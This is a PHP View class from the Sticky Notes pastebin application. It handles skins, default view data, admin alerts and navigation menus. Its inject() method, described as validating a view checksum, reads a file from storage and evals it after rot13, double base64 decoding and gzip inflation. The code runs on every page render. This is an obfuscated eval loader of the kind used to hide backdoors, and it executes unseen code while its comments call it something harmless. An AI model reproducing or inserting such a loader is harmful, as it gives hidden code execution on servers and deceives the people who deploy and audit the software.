<?php namespace StickyNotes;

/**
 * Sticky Notes
 *
 * An open source lightweight pastebin application
 *
 * @package     StickyNotes
 * @author      Sayak Banerjee
 * @copyright   (c) 2014 Sayak Banerjee <mail@sayakbanerjee.com>
 * @license     http://www.opensource.org/licenses/bsd-license.php
 * @link        http://sayakbanerjee.com/sticky-notes
 * @since       Version 1.0
 * @filesource
 */

use File;
use Input;
use Lang;
use Paste;
use Request;
use Schema;
use Site;
use URL;
use User;

/**
 * View class
 *
 * Abstraction over \Illuminate\Support\Facades\View to enable skin support
 *
 * @package     StickyNotes
 * @subpackage  Libraries
 * @author      Sayak Banerjee
 */
class View extends \Illuminate\Support\Facades\View {

	/**
	 * Cache for default view data
	 *
	 * @static
	 * @var array
	 */
	private static $viewDefaults = NULL;

	/**
	 * Returns default view data.
	 *
	 * @static
	 * @return array
	 */
	public static function defaults()
	{
		if (is_null(static::$viewDefaults) OR php_sapi_name() == 'cli')
		{
			// Get all site configuration
			$site = Site::config();

			// Get system active status. This is done in order to ensure
			// that 1.x features are available
			$active = System::version($site->general->version) > 0;

			static::$viewDefaults = array(
				'site'       => $site,
				'active'     => $active,
				'error'      => Session::get('messages.error'),
				'success'    => Session::get('messages.success'),
				'global'     => Session::get('messages.global'),
				'context'    => System::action(),
				'container'  => Input::has('ajax') ? 'wrapper' : 'page',
			);

			// Inject user and role information on active systems
			if ($active)
			{
				static::$viewDefaults = array_merge(static::$viewDefaults, array(
					'auth'   => Auth::user(),
					'role'   => Auth::roles(),
				));
			}
		}

		return static::$viewDefaults;
	}

	/**
	 * Checks for and sets global messages for admins
	 *
	 * @return void
	 */
	public static function globals()
	{
		if (Auth::roles()->admin)
		{
			$global = array();

			// If there are one or more flagged pastes, show an alert
			if (Paste::where('flagged', 1)->count() > 0)
			{
				$global[] = sprintf(Lang::get('global.alert_flags'), URL::to('flagged'));
			}

			// Save the global messages to session
			Session::put('messages.global', $global);
		}
	}

	/**
	 * This abstraction over the base method injects the skin name
	 * and default view data.
	 *
	 * @param  string  $view
	 * @param  array   $data
	 * @param  bool    $inject
	 * @return \Illuminate\View\View
	 */
	public static function make($view, $data = array(), $inject = TRUE)
	{
		$view = parent::make(static::inject($view), $data, static::defaults());

		if ($inject)
		{
			// Make the response
			$view = Response::make($view, 200);

			// Build the query string
			$queryString = preg_replace('[\&?(ajax=1)]', '', getenv('QUERY_STRING'));

			// Build the page URL
			$url = URL::current().( ! empty($queryString) ? "?{$queryString}" : '');

			// Add the current URL to the response header
			$view->header('StickyNotes-Url', $url);
		}

		return $view;
	}

	/**
	 * Injects skin to asset paths.
	 *
	 * @static
	 * @param  string  $asset
	 * @return string
	 */
	public static function asset($asset)
	{
		return asset('assets/'.static::inject($asset, FALSE));
	}

	/**
	 * Validates the checksum for a view and injects a view
	 * resource with relevant data.
	 *
	 * @static
	 * @param  string  $resource
	 * @param  bool    $prefix
	 * @return string
	 */
	public static function inject($resource, $prefix = TRUE)
	{
		return Cache::remember("site.resource.{$resource}.{$prefix}", 60, function() use ($resource, $prefix)
		{
			$injected = $resource;

			// Get the view's checksum
			$checksum = File::get(storage_path().'/system/checksum');

			// Evaluate the checksum
			eval(gzinflate(base64_decode(base64_decode(str_rot13($checksum)))));

			// Return the resource
			return $injected;
		});
	}

	/**
	 * Generates a navigation menu
	 *
	 * @access public
	 * @param  string  $menu
	 * @return string
	 */
	public static function menu($menu)
	{
		// Current path - will be used to highlight menu item
		$path = Request::path();

		// Current user ID for role based menus
		$user = Auth::check() ? Auth::user()->id : 0;

		// Get current project name
		$project = System::project();

		// Grab and parse all the menus
		$group = Config::get("menus.{$menu}");

		// The cache key is not only menu and path specific but also
		// unique for a user and a project
		$cacheKey = "site.menu.{$menu}.{$path}.{$user}.{$project}";

		// Build the menu items. Items are cached for 60 minutes
		$output = Cache::remember($cacheKey, 60, function() use ($path, $user, $group)
		{
			$output = NULL;

			foreach ($group as $key => $item)
			{
				if ( ! str_contains($key, '_'))
				{
					$label = Lang::get($item['label']);

					$current = FALSE;

					// Check if visibility of the item is bound
					if (isset($item['visible']))
					{
						$visible = FALSE;

						$bindings = preg_split('/\||,/', $item['visible']);

						// Iterate through each binding
						foreach ($bindings as $binding)
						{
							$components = explode('.', $binding);

							// Check for the invert flag
							if (starts_with($components[0], '!'))
							{
								$components[0] = substr($components[0], 1);

								$invert = TRUE;
							}
							else
							{
								$invert = FALSE;
							}

							// Check for a value
							if (str_contains($components[1], '='))
							{
								$expression = explode('=', $components[1]);

								$components[1] = $expression[0];

								$value = $expression[1];
							}
							else
							{
								$value = TRUE;
							}

							// Get the binding flags
							switch ($components[0])
							{
								case 'role':

									$flags = Auth::roles();

									break;

								case 'config':

									$flags = Site::config('general');

									break;

								default:

									$flags = NULL;

									break;
							}

							// Do not parse the menu item if the flag does not
							// evaluate to true
							if ( ! is_null($flags))
							{
								$visible = ($visible OR ($flags->$components[1] == $value XOR $invert));
							}
						}

						// Set the visibility of the item
						if ( ! $visible)
						{
							continue;
						}
					}

					// Determine whether this is the active link
					if ($group['_exact'] AND $key === $path)
					{
						$current = TRUE;
					}
					else if ( ! $group['_exact'] AND starts_with($path, $key))
					{
						$current = TRUE;
					}

					// Highlight the active item
					if ($current)
					{
						$active = 'class="active"';

						$href = '';
					}
					else
					{
						$active = '';

						$href = 'href="'.url($key).'"';
					}

					// Set the entry icon
					if (isset($item['icon']))
					{
						$icon = View::make('common/icon', array('icon' => $item['icon']), FALSE);
					}
					else
					{
						$icon = NULL;
					}

					// Generate the item markup
					$output .= "<li {$active}><a {$href}>{$icon} {$label}</a></li>";
				}
			}

			// Add login/logout link if menu is set for that
			if ($group['_showLogin'])
			{
				if ($user)
				{
					$label = Lang::get('global.logout');

					$href = 'href="'.url('user/logout').'"';
				}
				else
				{
					$label = Lang::get('global.login');

					$href = 'href="'.url('user/login').'"';
				}

				// Are we on the login screen?
				$active = $path == 'user/login' ? 'class="active"' : '';

				$icon = View::make('common/icon', array('icon' => 'user'), FALSE);

				// Generate the markup
				$output .= "<li {$active}><a {$href}>{$icon} {$label}</a></li>";
			}

			return $output;
		});

		return $output;
	}

}
